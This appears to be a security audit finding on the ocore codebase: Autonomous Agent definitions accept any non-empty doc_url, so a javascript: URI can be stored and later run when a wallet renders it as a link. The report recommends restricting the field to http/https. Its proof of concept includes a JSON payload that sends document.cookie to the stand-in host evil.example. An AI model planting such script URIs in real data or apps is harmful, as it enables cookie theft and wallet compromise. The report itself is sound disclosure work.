Confirmed: `doc_url` in AA definitions is only validated as a non-empty string with no scheme restriction, at [1](#0-0) . This field is fully attacker-controlled (any unprivileged unit poster can define an AA) and is designed to be surfaced to end-users as a clickable documentation link when they interact with the AA (e.g., in a wallet's AA info/confirmation UI), analogous to BookStack's "attached link."

### Title
Unrestricted `doc_url` scheme in AA definitions allows javascript:-URI injection reachable by any unprivileged unit poster - (File: aa_validation.js)

### Summary
An attacker can define an Autonomous Agent (AA) whose `doc_url` field contains a `javascript:` (or `data:`/`vbscript:`) URI instead of a legitimate documentation link. `validateAADefinition()` only checks that `doc_url` is a non-empty string, never that it uses `http:`/`https:`, so this malicious value is accepted into consensus and propagated to every node and wallet that reads the AA definition.

### Finding Description
`validateAADefinition()` in [2](#0-1)  validates the AA definition template and, for the optional `doc_url` field, only calls `isNonemptyString(template.doc_url)`. No URL-scheme allow-listing (e.g., restricting to `https://`) is performed, unlike other user-supplied resource references elsewhere in the codebase (compare `uri.js`'s `auth` URL handling which explicitly requires `/^https?:\/\//`, at [3](#0-2) ). Because `doc_url` is part of the AA "definition" message that is posted and validated like any other unit content (via `validateInlinePayload` case `"definition"`, [4](#0-3) ), any unprivileged user can post a valid AA whose `doc_url` is `javascript:...` or similar. This mirrors the BookStack CVE-2020-26210 pattern exactly: an editor-controlled "attached link" field that is stored without scheme validation and is intended to be rendered/clicked by another user, allowing execution of attacker-controlled script when that link is opened in a wallet UI or documentation viewer that renders `doc_url` as a clickable anchor.

### Impact Explanation
If a wallet or any tool built on `ocore` displays `doc_url` as a clickable/openable link (its evident purpose, given the field name and the fact it's whitelisted specifically for user documentation of the AA), a victim who views AA details and clicks "documentation" executes attacker-controlled JavaScript in the context of that application. In wallet contexts this can lead to theft of private keys/mnemonics, unauthorized transaction signing, or draining of funds—satisfying "concrete unauthorized spending" or "AA fund loss." Any AA author (a completely unprivileged role — anyone can define and post an AA) can embed this payload, and any user who opens AAs from an unknown/untrusted author is at risk.

### Likelihood Explanation
High likelihood: defining and posting an AA with an arbitrary `doc_url` value requires no special privilege or fee beyond the base unit-posting cost, and the field passes all current consensus validation. The only precondition is that a downstream client renders `doc_url` as a link, which is a reasonable and intended use of the field.

### Recommendation
Restrict `doc_url` to safe URI schemes at the validation layer (e.g., require `template.doc_url.match(/^https?:\/\//i)`), mirroring the scheme check already applied to `auth`'s `url` parameter in `uri.js`. Reject any other scheme (`javascript:`, `data:`, `vbscript:`, `file:`, etc.) during `validateAADefinition()` so no client can be tricked into executing an attacker-supplied script URI.

### Proof of Concept
1. Attacker composes and posts a valid AA definition unit where the template includes:
```json
["autonomous agent", {
  "doc_url": "javascript:fetch('https://evil.example/steal?c='+document.cookie)",
  "messages": [{"app":"payment","payload":{"asset":"base","outputs":[{"address":"{trigger.address}","amount":1}]}}]
}]
```
2. `validateAADefinition()` accepts this because `isNonemptyString('javascript:...')` returns `true` and no scheme check exists (`aa_validation.js:761-762`).
3. The unit is validated and written normally (`validation.js:1747-1768`).
4. Any wallet/UI that reads the AA definition and renders `doc_url` as a clickable "View documentation" link will execute the attacker's JavaScript when a victim clicks it. [1](#0-0) [4](#0-3) [3](#0-2)
